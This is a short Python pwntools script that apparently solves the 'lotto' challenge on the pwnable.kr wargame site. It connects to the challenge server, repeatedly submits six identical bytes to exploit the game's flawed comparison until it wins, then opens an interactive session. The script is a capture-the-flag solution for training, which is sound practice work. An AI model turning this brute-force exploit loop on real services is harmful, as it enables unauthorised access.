from pwn import *

p = remote('pwnable.kr',10011)

# IF using solve2.py (unnecessary but super fast)
# p = process('./lotto')

resp = b'bad luck'
while b'bad luck' in resp:
    p.sendlineafter(b'3. Exit', b'1')
    p.sendafter(b'Submit your 6 lotto bytes :', b'!'*6)
    p.recvline()
    
    resp = p.recvuntil(b'- Select Menu -',timeout=3)

print(resp)

p.interactive()